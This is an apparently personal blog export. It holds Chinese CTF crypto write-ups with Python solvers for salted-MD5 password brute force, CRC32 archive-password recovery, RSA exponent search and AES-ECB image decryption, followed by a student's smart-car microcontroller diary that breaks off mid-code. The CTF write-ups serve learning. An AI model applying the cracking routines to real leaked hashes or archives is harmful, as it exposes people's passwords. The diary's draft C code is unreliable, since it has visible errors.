string#由于flag的开头是TWCTF&#123;&#125;,而a,b一定会在251以内，所以可以将a,b爆破出来def find_key(): for a in range(251): for b in range(251): if (ord("T") * a + b) % 251 == int_enc[0] and (ord("W") * a + b) % 251 == int_enc[1] and (ord("C") * a + b) % 251 == int_enc[2]: return a, benc = "805eed80cbbccb94c36413275780ec94a857dfec8da8ca94a8c313a8ccf9"int_enc = []#将上面密文转化成10进制for i in range(0, len(enc), 2): int_enc += [int(enc[i:i + 2], 16)]a,b = find_key()#生成所有可打印字符chars = string.printableflag = ""for i in int_enc: for j in chars: if (ord(j)*a+b)%251 == i: flag += jprint(flag)#TWCTF&#123;Faster_Than_Shinkansen!&#125; 好多盐 某遗留系统采用固定格式+6-10位数字类型密码，今天他们发生了数据泄露事件，已知固定格式为{FLAG:}，做为一名黑客，你要开始干活了。字符串长度为10位 题目给了很多hash过的文件，以及盐，关于这方面的概念可以自行百度md5与盐的相关知识，直接爆破就行: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/1#!usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/1from Crypto.Hash import MD5password = '''f09ebdb2bb9f5eb4fbd12aad96e1e929 p5Zg6LtD 6cea25448314ddb70d98708553fc0928 ZwbWnG0j 2629906b029983a7c524114c2dd9cc36 1JE25XOn 2e854eb55586dc58e6758cfed62dd865 ICKTxe5j 7b073411ee21fcaf177972c1a644f403 0wdRCo1W 6795d1be7c63f30935273d9eb32c73e3 EuMN5GaH d10f5340214309e3cfc00bbc7a2fa718 aOrND9AB 8e0dc02301debcc965ee04c7f5b5188b uQg6JMcx 4fec71840818d02f0603440466a892c9 XY5QnHmU ee8f46142f3b5d973a01079f7b47e81c zMVNlHOr e4d9e1e85f3880aedb7264054acd1896 TqRhn1Yp 0fd046d8ecddefc66203f6539cac486b AR5lI2He f6326f02adaa31a66ed06ceab2948d01 Aax2fIPl 720ba10d446a337d79f1da8926835a49 ZAOYDPR2 06af8bcc454229fe5ca09567a9071e62 hvcECKYs 79f58ca7a81ae2775c2c2b73beff8644 TgFacoR3 46aaa5a7fef5e250a2448a8d1257e9cf GLYu0NO4 2149ac87790dd0fe1b43f40d527e425a 5Xk2O1sG d15a36d8be574ac8fe64689c728c268e aZikhUEy ff7bced91bd9067834e3ad14cc1464cd E7UROqXn 8cc0437187caf10e5eda345cb6296252 XPin3mVB 5cfcdca4a9cb2985a0b688406617689e nsGqoafv 5a7dfa8bc7b5dfbb914c0a78ab2760c6 YC1qZUFR 8061d8f222167fcc66569f6261ddd3cc wNgQi615 3d8a02528c949df7405f0b48afe4a626 CO2NMusb 70651acbc8bd027529bbcccdbf3b0f14 CAXVjFMd a9dbe70e83596f2d9210970236bdd535 TL6sjEuK 9ed6ef5780f705ade6845b9ef349eb8f tJ90ibsz 4b46fac0c41b0c6244523612a6c7ac4a VTjOSNmw 8141e6ecb4f803426d1db8fbeb5686ef lh75cdNC df803949fd13f5f7d7dd8457a673104b V39sEvYX 19052cc5ef69f90094753c2b3bbcd41d YwoGExpg cf8591bdccfaa0cdca652f1d31dbd70f pJCLui49 66e10e3d4a788c335282f42b92c760a1 NQCZoIhj 94c3ae5bcc04c38053106916f9b99bda vOktelLQ e67e88646758e465697c15b1ef164a8d x0hwJGHj 84d3d828e1a0c14b5b095bedc23269fb 2HVWe9fM 264a9e831c3401c38021ba3844479c3f Cx4og6IW ed0343dec184d9d2c30a9b9c1c308356 g2rqmPkT ad5ba8dc801c37037350578630783d80 pFK2JDT5 3f588bedb704da9448e68fe81e42bca6 4ANDOiau 970c9cf3cad3dfa7926f53ccaae89421 R6ML7Qy8 e0a097b7cceaa7a8949fe039884e4a2d dul2ynqL 7df505218102c64b1fe4fa5981ddb6fa jPeoyS57 fd4f6043da1f7d5dca993c946ef6cd7c 6p9CwGaY 5fe6d99b9a2824949279187c246c9c30 OGQ2J57y 135b150ad513a961089bb1c05085a3d9 h0dw1Fro ad6af4fb623b3c51181a371911667fed HbQT4dRz c9fa4b0db317d88e2b10060225e92494 ebVnpMzS d0deab17d115bd6fdce8592bb3667643 bL5zwgvX 006f0cb3a422716692f143f28eb0d187 NHXg1Fof ddc125de34da1a6ec0cbe401f147bc8f GDai9Y0n be5052053c5a806e8f56ed64e0d67821 40alyH3w aaf18ac446b8c385c4112c10ae87e7dc ZJQzuIL0 a2db20a4b7386dc2d8c30bf9a05ceef7 QnpOlPWH 8a4fbc32a3251bb51072d51969ba5d33 rtcbipeq 5e35d2c9675ed811880cea01f268e00f i1Hbne6h 9da23007699e832f4e9344057c5e0bd3 EtbGpMSW f09233683d05171420f963fc92764e84 fxHoinEe 4feabf309c5872f3cca7295b3577f2a8 KymkJXqA 9b94da2fa9402a3fdb4ff15b9f3ba4d2 G3Tdr1Pg b3cd8d6b53702d733ba515dec1d770c5 Y71LJWZz 6a5b3b2526bb7e94209c487585034534 rIwb4oxt e9728ef776144c25ba0155a0faab2526 e1sOXSb8 d41a5e7a98e28d76dbd183df7e3bcb49 36bedvia 81d5ebfea6aff129cf515d4e0e5f8360 dDG4qTjW'''password = password.split('\n')def solve(): for i in password: print(i) pass_md5 = i.split(' ')[0] salt = i.split(' ')[1] #由于有着6-10位数字 for j in range(100000,10000000000): print(j) md5 = MD5.new() temp = '&#123;FLAG:'+str(j).zfill(10)+'&#125;'+salt temp = bytes(temp,encoding="utf-8") md5.update(temp) if md5.hexdigest() == pass_md5: print(j) breaksolve()#1234567890 影之密码 请分析下列密文进行解密 8842101220480224404014224202480122 得到flag，flag为8位大写字母 分析： flag是8位大写字母 有7个0，正好分成8段 每段中仅有1，2，4，8，全是2的幂数 查询有关2^n的加密方式，二进制幂数加密法 这里与实际上的二进制幂数加密还是稍微有些区别，8 -– 3 但是这里直接给出，最后解密的结果其实就是将其相加，转成ASCII 解密： 123456789101112131415#!usr/env/python3#coding=utf-8#owner:IFpopenc = '8842101220480224404014224202480122'enc = enc.split('0')print(enc)ans = ''for i in enc: temp = 0 for j in i: temp += int(j) ans += chr(ord('A')+temp-1)print(ans)#WELLDONE Jarvis’s encryption system Let’s play with Jarvis’s new encryption box. nc pwn.jarvisoj.com 9880 下载下来有两个附件：一个是crypto500.py，一个有关加密过程的图片(就不放上来了) 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom Crypto.PublicKey import RSAimport gmpy2key = RSA.importKey(open('private.pem').read())N = 808637320166213096433765975908829772554859069394497436792703828416763985949910999652518305818627321094257781267795371106923808192073932662313603219525599014635435542122940843344921727149256852355110338886574805360544004118210641173633231100848831019159519744863314748281129830905559513810272933968408858616937223539622595750248885831720830102914499513408356858587797522763592193335162884129664298938995394243273615798207065590802899685489088903478734288977143851327400816886878238915788561611104380001569848016035186213716602462262685777960742683591155978590371074585063550419528377002596163321548052257322263024813745933243795081592986850478573362522245788630785664119935566422559659277401321793012274415007906726880710258434953224297253000176721652344571059040066987969691706315602374506498087282531643212970147526356421919309049062439117990930204486012562031589114880474346559407445496718773030816258262150397230280669274725009415653773469037623986165899557423095323109994543129373149980880777219450714265152054529287453826506032747047856303879606356141420416161004589629524370677871918513405209191951229311529443558187652701599377904802383252318582028816524498306240682160249309341335405511246150908708558397938689907425750101507p = key.pq = key.qdef encrypt(m, e): return pow(m, e, N) def main(): print 'Welcome to Jarvis\'s encryption system.Let\'s init the cipher first:' print "e:", e = int(raw_input().strip()) d = gmpy2.invert(e,(p-1)*(q-1)) print "d: %d" % d cnt = 0 while True: cnt += 1 print "m%d:" % cnt, m = int(raw_input().strip()) c = encrypt(m, e) print "c%d: %d" % (cnt, c) print ''if __name__ == '__main__': main() 使用上述nc命令进行访问，键入e值，会返回d值。 先把图片中的信息提取出来(用winhex查看末尾就行) 通过已知的明文、密文对e进行爆破 12345678910111213141516171819202122#usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/5import gmpy2from Crypto.Util import numbern = 808637320166213096433765975908829772554859069394497436792703828416763985949910999652518305818627321094257781267795371106923808192073932662313603219525599014635435542122940843344921727149256852355110338886574805360544004118210641173633231100848831019159519744863314748281129830905559513810272933968408858616937223539622595750248885831720830102914499513408356858587797522763592193335162884129664298938995394243273615798207065590802899685489088903478734288977143851327400816886878238915788561611104380001569848016035186213716602462262685777960742683591155978590371074585063550419528377002596163321548052257322263024813745933243795081592986850478573362522245788630785664119935566422559659277401321793012274415007906726880710258434953224297253000176721652344571059040066987969691706315602374506498087282531643212970147526356421919309049062439117990930204486012562031589114880474346559407445496718773030816258262150397230280669274725009415653773469037623986165899557423095323109994543129373149980880777219450714265152054529287453826506032747047856303879606356141420416161004589629524370677871918513405209191951229311529443558187652701599377904802383252318582028816524498306240682160249309341335405511246150908708558397938689907425750101507m1 = 89372489723987498237894327984372c1 = 792279062886162218096642776664224514933347584486280723004734021586336212749049858600481963227286459323970478541843083793725468708921717787221937249530784012084036132167698694870670989692185525559265359595824727956010042190235432643115112280623082788133230708728369892499755238276075667536752879449115011933006031581738186877618805996280847737363426887886868682686959858371130406926178828888575004380515988821399247906070333132810952695798429265793849588130806947806841034544612000197604854503195512120025729616966658790540157838337703936086683817085220432748606686965902101050255048796382841321391071407100767404596588780879740560771450534303617347553555472893929700798373187625224545676303975128589469709553887522697982505366205159178754377849727155295773459020853899833570753142832536760229326028534739725856990225488803963836214548294423502322319111713836053680359093114158912017408230992904911531693795674356749450578360594750306010644345865018135713049088702085668117922755659876667178408188245170381487842104129405699987082399408416605832498886309106565903612880735897179022046135207448286905927468981921408174446350113407999312543013150441972687118445672308468055301677455644948365453703227341347327118261153884632046860369729e = 1 while(1): print(e) c = pow(m1,e,n) if c == c1: #7845741 跑了很久，希望之后能找到更快的方法 print("done!") print(e) break e = e + 1 利用nc访问链接，得到d 解密就行： 1234567891011121314#usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/5import gmpy2from Crypto.Util import numberd = 624460328909915360701402168639641282028094468418961878947574807290638891758678991143435088653980701535371225162050430031333639072505365342535152293096454464491608234713910040741806054032872119204341656042243036836513731486079394171780995659012791615808025872985542653518800484827924355387767430294123689221121329057758535673622344148467540232245253256875196052350040448617224502051601181938246394036842235391465615724331125440683500889291172253639404968619326290436776700446299000007994603663440301337649478949521483497552296109838827309290662620012954396232530653067994746179325738761837228276717554780296018709380622306541045859622715377902354561164951333797443088787938481179135106105790091663516291819506679417163921126064227724274720567814644923715786512409941352289194976639518315198223889636540907899742620702027181209723760906029440110133038012652837512150214031930229627563605747245442722777826347211476418833664939434587222857079580932195626606642019627685477852118740507133047312988551945249158637120933025247874896831420739652406553559282198158772718455703088272187706565621125165787151495212884395636011063049499722644316616892917352706474956487897928799493388647214180485284836266930315584778253034297866155428036121429n = 808637320166213096433765975908829772554859069394497436792703828416763985949910999652518305818627321094257781267795371106923808192073932662313603219525599014635435542122940843344921727149256852355110338886574805360544004118210641173633231100848831019159519744863314748281129830905559513810272933968408858616937223539622595750248885831720830102914499513408356858587797522763592193335162884129664298938995394243273615798207065590802899685489088903478734288977143851327400816886878238915788561611104380001569848016035186213716602462262685777960742683591155978590371074585063550419528377002596163321548052257322263024813745933243795081592986850478573362522245788630785664119935566422559659277401321793012274415007906726880710258434953224297253000176721652344571059040066987969691706315602374506498087282531643212970147526356421919309049062439117990930204486012562031589114880474346559407445496718773030816258262150397230280669274725009415653773469037623986165899557423095323109994543129373149980880777219450714265152054529287453826506032747047856303879606356141420416161004589629524370677871918513405209191951229311529443558187652701599377904802383252318582028816524498306240682160249309341335405511246150908708558397938689907425750101507c = 738822002752800877524466308025949155169562722946933006009883884249589602039677687891359871510923927357766748131398443497541198900771818831638644263405425815579383553019562159083788644122365536627592737115316351290153544908592280731090451811311680698586032725090719266003369555867584457372823678746133588560994163232730766388456903527206840527304843529539480355012405496730615078972755415860013097394363116913629756292725693596880188792245847698225435105827398989245800248197290718407831242734331874121327502564673597694670795036098967372950089253263743880807024448724715652660602771818683520844873803372738417012436219777372987997036211306992938395670636075660990930360358970016244484405618827909229400111542660072678812089441010001235353317911131109787281238112284352067511452432985149442969693926797740772628154057474332702139775407456229918917403138849681496015981718513476254353617586634306067889050783266988506871489696817574207289110594169371818597141857443042841485880477066344316648550850088971005108756497748568090122624591451915965314486079436499049418137147522360690326710468200339550170216543240318289067712843687012174036874897324652429812609807952220427326987655148639613323665786093803557065570465270944069296977739085m = pow(c,d,n)print(number.long_to_bytes(m))#USTCTF&#123;U_r_real33y_m4st3r_0f_math&#125; 神秘压缩包 就不告诉你密码，看你怎么办。 下载下来一个rar压缩包，一般rar是不会存在伪加密的(至少目前没有遇到过)，尝试爆破，发现时间太长，不太行。 剩下就是尝试一个crc32爆破了(方法同Complicated Crypto)，这里尝试5位 123456789from crc32_util import *crc = [0x20AE9F17, 0xD2D0067E, 0x6C53518D, 0x80DF4DC3, 0x3F637A50, 0xBCD97038]for i in crc: crc32_reverse(i, 5) 得到结果： 12345678910111213141516171819202122verification checksum: 0x20ae9f17 (OK)[find]: l./rc (OK)[find]: passw (OK)verification checksum: 0xd2d0067e (OK)[find]: "_YWn (OK)[find]: N,tS* (OK)[find]: Rc(R&gt; (OK)[find]: ord:f (OK) [find]: s=8;r (OK)verification checksum: 0x6c53518d (OK)[find]: /8LWp (OK)[find]: CKaS4 (OK)[find]: ~Z-;l (OK) verification checksum: 0x80df4dc3 (OK)[find]: apEwF (OK)verification checksum: 0x3f637a50 (OK)^Q6w (OK)[find]: \&lt;0Zk (OK)[find]: a-|23 (OK)[find]: &#125;b 3' (OK)verification checksum: 0xbcd9703b (OK)[find]: hyAo5 (OK) 所以密码为：password:f~Z-;lapEwF\&lt;0ZkhyAo5 得到XUSTCTF{6ebd0342caa3cf39981b98ee24a1f0ac} 简单ECC 已知椭圆曲线加密Ep(a,b)参数为 p = 15424654874903 a = 16546484 b = 4548674875 G(6478678675,5636379357093) 私钥为 k = 546768 求公钥K(x,y) 提示：K=kG 提交格式XUSTCTF{x+y}(注意，大括号里面是x和y加起来求和，不是用加号连接) 1234567891011121314151617181920212223242526#!usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/5import gmpy2a = 16546484b = 4548674875M = 15424654874903G = (6478678675, 5636379357093)#初始的K与G是相同的，K = (6478678675,5636379357093)for i in range(1,546768): x1,y1 = K x2,y2 = G if K!=G: t = int((y2-y1)*gmpy2.invert(x2-x1,M)) else: t = int((3*x1*x1+a)*gmpy2.invert(2*y1,M)) x3 = t*t-x1-x2 y3 = t*(x1-x3)-y1 K = (x3%M,y3%M)print("XUSTCTF&#123;"+str(K[0]+K[1])+"&#125;")#XUSTCTF&#123;19477226185390&#125; God Like RSARSA-集锦 Extremely hard RSARSA-集锦 very hard RSARSA-集锦 hard RSARSA-集锦 BrokenPic下载下来是一个bmp文件，文件损坏不能打开，使用winhex打开，发现没有bmp文件头,填入文件头重新填入： 142 4D 38 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 02 0C 30 00 12 0B 00 00 12 0B 00 00 00 00 00 00 00 00 00 00 这里补充一下有关bmp头格式： 12345678910111213141516//存储方式为小端序42 4D //2bytes &quot;BM&quot;36 58 02 00 //4 bytes Total size included &quot;BM&quot; magic(s)00 00 00 00 //这里必须置为036 00 00 00 //从文件开始到位图数据之间的偏移量 这里是5428 00 00 00 //bitmap head 的大小为40字节56 05 00 00 //宽度为136600 03 00 00 //高度为76801 00 //这个字的值永远是118 00 //每个像素占用的位数00 00 00 00 //压缩方式00 0C 30 00 // 3148800的字节大小 这个可通过看文件详细信息得到 12 0B 00 00 //水平分辨率12 0B 00 00 //垂直分辨率00 00 00 0000 00 00 00 形成新的bmp后，得到里面得内容： key:PHRACK-BROKENPIC 和一个不能扫出东西的二维码 现在问题来了，这个key是用来干嘛的，再看看bmp的16进制格式： 123D55F7AB07937BA26B22468328A68C1F2......后面好像都一样 想到（这个我还真没想到）AES是分组加密，16字节一组，不过目前所学有key的密码貌似也不是很多 尝试AES解密： 123456789101112131415161718#usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/11/5from Crypto.Cipher import AESkey = "PHRACK-BROKENPIC"#python3之后加密函数中传入的都是字节形式key = key.encode("utf-8")aes = AES.new(key,mode = AES.MODE_ECB) #这是ECB的加密形式，以后这种解密还是使用python不需要指定modewith open('brokenpic.bmp','rb') as f: data = f.read() pic = aes.decrypt(data)with open('ans.bmp','wb') as f: f.write(pic) 然后也是想之前那样，修复bmp，可以扫码得到flag:PCTF{AES_i5_W3ak_foR_im4ge} Medium RSARSA-集锦]]></content>
      <categories>
        <category>wp</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Jarvisoj</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SmartCar-study]]></title>
    <url>%2F2019%2F10%2F25%2FSmartCar-study%2F</url>
    <content type="text"><![CDATA[这是一位不成器的计算机选手开始挑战跨专业的探测信标的智障车智能车🔞 2019/10/22练习如何焊接电路板，成就：成功焊坏一个芯片，貌似是车队最后一个 😆 2019/10/23看完IAR使用手册，熟悉IAR的实际操作😁 工程相关源文件的树型结构，可分为“工程配置文件”，“源程序文件”，“机器码文件” “工程配置文件”包含的文件与芯片及工程初始化相关，包含链接文件与启动代码文件。启动代码文件“crt0.s”与“start.c”，“链接文件”包括Pflash.icf与Ram.icf两个文件，通过修改它们可以将可执行代码链接到芯片RAM中或Flash中 ”源程序文件夹“包括C语言程序、头文件，C语言程序一般包括构件C文件夹”Component_C“、框架C文件夹”Frame_C“、中断服务例程源文件isr与主程序源文件main，头文件一般包括include.h、构件头文件”Component_H”,框架C文件夹“Frame_H”。系统启动并初始化后，程序先执行配置文件的启动代码文件，随后根据main中定义的逻辑顺序执行，当遇到中断请求时，转而执行isr.c中定义的相应中断处理程序；中断结束，则返回中断出继续顺序执行。与总体有关的架构程序相关的头文件和源文件分别放在了Frmae_H和Frame_C文件夹中，其中Frame_H一般会有common.h、system_SKEAZ1284.h、sysinit.h、vectors.h等头文件，system_SKEAZ1284.h时芯片寄存器及相关定义头文件，它被视为芯片的接口文件，sysinit.h与sysinit.c(存在于Frame_C中)一起完成系统初始化，系统时钟等，而common.c与common.h一起完成一些基本函数 “机器码文件”包括.out文件和.map文件，写到Flash中的文件为.out文件 2019/10/24今天把kea128code中的common部分函数，梳理了一下有哪些函数以及函数的用途👀 文件名称 文件功能 assert.c 包含assert_failed函数，用于在出错的时候进行报错 assert.h 包含assert中函数说明，定义了DEBUG_PRINT common.h 这里是一个公用的头文件，集合了CPU header file，platform specific header file，toolchain specfic header filescommon utilities io.c in_char(从端口捕获输入)，out_char(将信息输出至指定端口)，char_present(貌似是返回目前端口的字符串，感觉in_char就够用了，不知道这个干嘛的） io.h 将io.c中的函数定义 memtest.c 包含memTestDataBus，memTestAddressBus，memTestDevice三个函数，分别测试数据总线，地址总线和硬件设备 memtest.h 定义memtest.c的函数以及数据格式 printf.c queue.c 由于C语言并没有队列、栈等数据结构，所以在C语言编写中需要自己写，这里自己定义了一些队列必须的函数，queue_init初始化了队列，queue_isempty判断队列是否为空，queue_add向队列中添加新元素，queue_remove删除队列中的元素，queue_peek获取队列第一个元素，queue_move整体队列迁移(这个函数倒是比较好玩，C++中queue库中貌似没有) queue.h 里面包含队列结构体的定义，头结点和尾结点，然后还有函数定义，这个队列应该是可以直接用的(目测比较完好) startup.c 里面有个pragma，是程序预处理指令，但跟我之前了解的不太一样，点这里查看详情。所以__section_begin获取这个段的首地址，__section_end获取这个段的尾地址。嗯？到现在还是没太看懂common_startup的具体实现，我的理解是他初始化程序的时候建立了一个虚拟的类似于操作系统的那部分，将ROM中存储的信息存入到RAM中，然后便于与内存建立交互。然后具体过程其实挺懵的，就是通过linker获得变长table以及变长RAM的地址，然后将table中的值赋给RAM,然后wirte_vtor(函数定义在cpu中的arm_cm0.h中)说是将指针指向一个新的复制的table，但里面的具体的程序也没看懂，接着看，获取了ROM的地址和data_ram的地址，然后将rom中的值开始赋值给data_ram了（我想问这里面还没有东西吧？？？），总之，这部分需要去问学长！！！ startup.h 就简单定义了common_startup这个函数 stdlib.h 一个C语言的库，这个不自带？？ typedef.h 自定义库，就是了一些数据结构的简写 uif.c uif.h 定义了uif.c中的函数原型，同时定义了最大指令长度为10 2019/10/25config files存在着flash和RAM的配置信息 cpu文件夹中相关函数信息 文件名 文件功能 arm_cm0.c 定义了stop，wait，write_vtor函数，stop是该进程进入了deepsleep，wait是从deepsleep状态苏醒至sleep会改变状态编码，wirte_vtor将矢量表偏移寄存器的值更改为指定值，被startup调用 arm_cm0.h 使用#undef取消系统对关键字的定义转而自己进行#define,使用asm进行汇编指令定义与使用，其中asm(&quot; CPSIE i&quot;)是允许全能中断，asm(&quot; CPSID i&quot;)是禁止全能中断，关键在单词末尾的’E’与’D’分别是enable和disable crt0.s 汇编代码文件，这是程序运行的开始（先于main函数），实际上的程序在汇编里面也会有这样一段代码，主要用途是将寄存器清零 isr.h 中断服务例程源文件isr.h,具体实现过程其实没咋弄懂，还是问问学长 start.c 启动代码文件,为什么要禁用看门狗，这里的cpu_identify和flash_identify是需要自己去写的，SystemInit这里也是禁用看门狗，但是不太明白的是为什么要禁用两次 start.h 定义start.c中函数的头文件 sysinit.c 初始化系统，包括sim、ics、uart等,现在其实还没怎么建立起SIM通信以及ICS和UART怎么使用的概念 sysinit.h 定义了sysinit.c中的函数 system_SKEAZ1284.h system_SKEAZ1284.h时芯片寄存器及相关定义头文件，它被视为芯片的接口文件 人傻了，这东西也太错综复杂，本来想着一周速成单片机，看来有点困难。。😭 还是接着看吧 drives文件 文件名 文件功能 acmp.h 这里我查到的是Analog Comparator，即模拟比较器，然后其中还定义了一些有关DAC函数，用于DAC转换？仔细研究的话还是得要慢慢看 adc.c 首先，这个不是moba游戏，没有ADC选手，ADC模块， 基本信息就是可以将连续的信号转换称数字信号，然后其中对每次处理的数字信号进行求和，之后求平均，达到了减少信息的失真率 adc.h 定义了关于ADC模块的一些配置信息，如adc_ref_list(适用电压范围)，ADC clock source(ADC时钟来源)，ADC divider(ADC中会按几位非分配)以及ADC mode(有8，10，12bit)的选择，但是什么情况选择什么样子的模式，这里应该怎么去控制也不太清楚 bit_band.h 位带的头文件，位带详情,可以使用普通的加载/存储指令来对单一的比特进行读写 BME.h BME 是Bit Manipulation Engine，位操作引擎功能，是M0+上的一个集成模块 crc.c CRC(循环冗余校验,Cyclic redundancy check)，这是一种通过除法运算来建立有效信息位和校验位之间的约定关系的，也就是用来确定信息传输是否正确，减少的误码的产生 flash.c 一个闪存驱动程序 flash.h 定义有关flash的配置，以及一些函数 ftm.c ftm定时器，详情 ftm.h 定义ftm必须的函数 gpio_icf.h 定义了gpio的配置文件，如输入输出端口信息以及寄存器信息，详情 gpio.c 实现了通用输入输出的必要函数 gpio.h 定义了gpio的函数 2019/10/26今天还是接着函数，发现个中文文档 2019/10/30现在稍微整理一下例程文件大概内容 文件名字 文件功能 8700_2100.c fun.c isr.c 定义串口中断、定时器中断、KBI中断 LQ12864.c 里面有着与LCD有关的函数，应该是显示的 LQKEY.c 关于按键的控制，key是按键，key1是拨码 LQLED.c 控制信号灯的函数 main.c 函数的入口点 MPU6050.c与MPU9250.c 是两种不同的微处理器，具体区别不清 MPUIIC.c 是微处理器的通信函数 Serial_oscilloscope.c 发送数据到上位机 2019/10/31现在大致有了一个关于main函数的思路： 1234567891011121314151617181920212223void main(void)&#123; DisableInterrupts ; //禁止中断，这里是防止其他程序在运行是抢占CPU资源,为了方便程序初始化 //获取时钟频率 //这里进行初始化 //LCD初始化 //adc初始化 //gpio初始化，拨码和九轴传感器 //定时中断初始化PIT //需要初始化蓝牙串口 //需要初始化OLED //需要初始化编码器 //FTM_count_clean()清除计数值 //需要初始化舵机 //需要初始化电机 EnableInterrupts; //开启总中断，现在中断恢复，其他程序可以正常运行 while(1)&#123; //接收蓝牙模块的控制 //接收app发送的速度与方向值，分别控制舵机与电机 &#125;&#125; 先学了一下关于pwm（脉冲调制）的知识，emmm,又是没有收获的一天 2019/11/2今天由于比赛原因没能参加今天的培训，晚上正好把ppt上的内容学习一下 关于推挽输出和开漏输出，这篇博客讲的很好了 一个小问题——就是三极管开关闭合机制是啥，输入0？截止？或者是我们自己控制的？ 之前讲过编码器原理？ 2019/11/7关于如何控制舵机的问题： https://www.cnblogs.com/zhoubatuo/p/6138033.html https://blog.csdn.net/qq_36192043/article/details/80812947 PWM意为脉冲宽度调制，可用于调整输出直流平均电压，对于矩形波而言，输出平均压等于峰值电压×占空比，占空比是一个脉冲周期内高电平时间与周期的比值，例如，峰值电压等于5V，占空比等于50%的方波信号平均电压等于2.5V，也就是万用表直流档测量得到的电压值 关于pwm波对舵机与电机的控制： 首先,关于舵机，先初始化pwm波，以一个定值频率和占空比告诉舵机这是此时状态的pwm波，之后对pwm波赋值的方式是改变占空比，也就是此时高电平的持续时间，但对于角度方面处理尚不清楚(我的理解是与初始值的相对值就是偏转角度)，我想我们应该用的是180度舵机吧？ 中位需要自己调 其次，关于电机，同样初始pwm，确定初始状态，也就是初始转速?但我想这开始启动的时候车不是应该不动嘛？这里占空比为啥不设为0。 这里就是0 现在需要解决的问题是motor控制和serov控制函数应该怎么去写，貌似需要用到PID控制,然后就是什么是开环启动什么是闭环启动 开环控制： 开环控制就是没有反馈系统的控制，比如使用调光台灯，旋钮调节到哪里就是那里，感觉不对可以再次调节一下 闭环控制： 一般友人们设定目标，由电路自己检测电路实行反馈检测数据。达到跟踪设定的操作过程就叫做闭环控制 2019/11/10昨天下午5个小时，用来检测驱动板的电路问题(而且不能升压至12V）开始是一直短路的，看完其他小组的板子才发现，芯片以及钽电容是有方向的，emmm，由于这块板子已经被折磨的不成人样了，所以最终决定重新焊，又花了一个小时，我们重新焊好了驱动板，好了，现在可以得到12V的电压，但是问题又来了，主控板上的双排母又出现接触不良的现象，所以之后在进行之后的检测吧（溜…毕竟我不是搞电路的，甩锅…) 2019/11/11昨天问了学长很多问题，现在在这总结一下，以便方便我后面的任务的进行 首先整理一下app的输出： 123456789101112131415//手动控制byte_buffer.write((byte) 0xc1);byte_buffer.write(Integer.toString(direction).getBytes());byte_buffer.write((byte) 32);//' 'byte_buffer.write(Integer.toString(speed).getBytes());byte_buffer.write((byte) 0);//遥杆控制byte_buffer.write((byte) 0xc3);byte_buffer.write(Float.toString(x).getBytes());byte_buffer.write((byte) 32);//' 'byte_buffer.write(Float.toString(y).getBytes());byte_buffer.write((byte) 32);//' 'byte_buffer.write(Integer.toString(speed).getBytes());byte_buffer.write((byte) 0); uart与蓝牙接收的问题 uart只能一个字节一个字节地接收，需要设置起始字节和结束字节,然后需要写一个中断函数UART2_buleteeth_ISR,具体如下： 123456789101112131415161718192021222324252627282930313233//接收蓝牙信息void UART2_buleteeth_ISR(void)&#123; //使用static是为了在传输一道指令时只初始化一次 static uint8_t buffer[128]; //记录信息 static uint8_t control_type = 0; //记录模式类型 static bool receive_start_flag = false; //标记一次传送是否完成 DisableInterrupts;//关总中断 //从通道中获取一个字节 uint8_t data = Uart_GetChar(UARTR2); if (data == 0xc1 || data == 0xc3) //一共会有两种模式 &#123; ptr = buffer; control_type = data; &#125; else if (data == '\0') &#123; *ptr = '\0'; ptr = buffer; if (receive_start_flag == 1) &#123; receive_start_flag = 0; Test(control_type,buffer); //接收字符串之后的处理 &#125; else &#123; *ptr = a; ++ptr; &#125; &#125; EnableInterrupts; //开总中断&#125; 之后进入Test程序中进行处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include "include.h"void Test(uint8_t control_type,uint8_t* buffer)&#123; //首先应该是通过蓝牙连接 //根据0xc1和0xc3来区别手动和矢量 //如果是矢量就获取x,y方向的矢量信息和速度 //如果是手动控制就获取控制码以及速度 //这里会使用uart接收字符串但具体尚不清楚,接收到字符串后对其进行处理，判断前面的0xc1或0xc3对control_type进行赋值 //control_type 控制类型 //cmd 操作码 //direction 方向 //speed 速度 //vec_x x方向向量 float //vec_y y方向向量 float //手动控制模式 if (control_type == 0xc1) &#123; //首先会对接收到的字符串进行操作获取cmd,speed等信息 //先确定相应模式 char* direction; char* speed; //从内存中读出字符串 sscanf((const char*)buffer, "%s %s", &amp;direction,&amp;speed) switch (cmd) &#123; //停车 0: //将两个电机的Pwm波全部置为0 FTM_PWM_Duty(CFTM2, FTM_CH0, 0); FTM_PWM_Duty(CFTM2, FTM_CH2, 0); break; //切回找灯模式 1: //这里暂且待定,可能需要摄像头？ break; //后退 2: //将控制电机转向的io输出全部变成反转 gpio_init(PTE3, 1, 0);//电机左反转 gpio_init(PTI3, 1, 1); gpio_init(PTE1, 1, 0);//电机右反转 gpio_init(PTG7, 1, 1); break; //左行 4: //将舵机的方向转为左边,这里的duty需要调正一下，具体数值我也不太清楚 FTM_PWM_Duty(CFTM1, FTM_CH1, 100); break; //右行 6: //同上，duty需要测试 FTM_PWM_Duty(CFTM1, FTM_CH1, 400); //顺时针 //这里采取的策略和右转是一样的，只是此时的是一直保持右转 7: break; //前进 8: //这里就是初始化的pwm，但是可能对于不同电机这个值可能不太一样，需要调整 gpio_init(PTE3, 1, 1);//电机左正转 gpio_init(PTI3, 1, 0); gpio_init(PTE1, 1, 1);//电机右正转 gpio_init(PTG7, 1, 0); //逆时针 9: //同7 break; default: break; &#125; &#125; //矢量控制模式 else if (control_type == 0xc3) &#123; //首先会对字符串进行操作，获取矢量信息和速度 //按照vec_y坐标进行分段 //如果vec_y&gt;0，则代表前进方向 if (vec_y &gt; 0) &#123; gpio_init(PTE3, 1, 1);//电机左正转 